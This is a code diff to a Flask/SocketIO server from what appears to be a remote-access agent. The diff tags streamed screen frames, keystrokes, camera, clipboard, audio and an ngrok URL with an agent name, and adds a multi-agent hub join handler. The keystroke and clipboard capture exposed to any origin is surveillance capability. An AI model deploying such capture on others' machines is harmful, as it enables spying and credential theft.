@@ -1,4 +1,6 @@
 import os
+import platform
+import socket as _sock
 from flask import Flask, render_template, jsonify, request
 from flask_socketio import SocketIO
 import processes as proc
@@ -8,6 +10,8 @@ import windows_control as wc
 app = Flask(__name__, template_folder="templates", static_folder="static")
 app.config["SECRET_KEY"] = os.urandom(24)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
+
+_AGENT_NAME = os.environ.get("NORA_NAME", "") or platform.node() or _sock.gethostname() or "local"
 
 _controller = None
 _recorder   = None
@@ -26,6 +30,12 @@ def init(controller_fn, recorder, camera, mic=None):
 @app.route("/")
 def index():
     return render_template("viewer.html")
+
+
+# ── Hub join (local mode) ─────────────────────────────────────────────────────
+@socketio.on("hub_join")
+def on_hub_join(_data=None):
+    socketio.emit("agent_list", [{"name": _AGENT_NAME}])
 
 
 # ── Camera ────────────────────────────────────────────────────────────────────
@@ -135,12 +145,12 @@ def on_desktop_cmd(data):
 
 
 # ── Broadcast helpers ─────────────────────────────────────────────────────────
-def broadcast_frame(b64):      socketio.emit("frame",          {"data": b64})
-def broadcast_key(char):       socketio.emit("key",            {"char": char})
-def broadcast_camera(b64):     socketio.emit("camera_frame",   {"data": b64})
-def broadcast_clipboard(text): socketio.emit("clipboard",      {"text": text})
-def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",      {"url": url})
-def broadcast_audio(b64):      socketio.emit("audio",          {"data": b64})
+def broadcast_frame(b64):      socketio.emit("frame",        {"data": b64,  "_agent": _AGENT_NAME})
+def broadcast_key(char):       socketio.emit("key",          {"char": char, "_agent": _AGENT_NAME})
+def broadcast_camera(b64):     socketio.emit("camera_frame", {"data": b64,  "_agent": _AGENT_NAME})
+def broadcast_clipboard(text): socketio.emit("clipboard",    {"text": text, "_agent": _AGENT_NAME})
+def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",   {"url": url,   "_agent": _AGENT_NAME})
+def broadcast_audio(b64):      socketio.emit("audio",        {"data": b64,  "_agent": _AGENT_NAME})
 
 
 def run(host="0.0.0.0", port=9090):
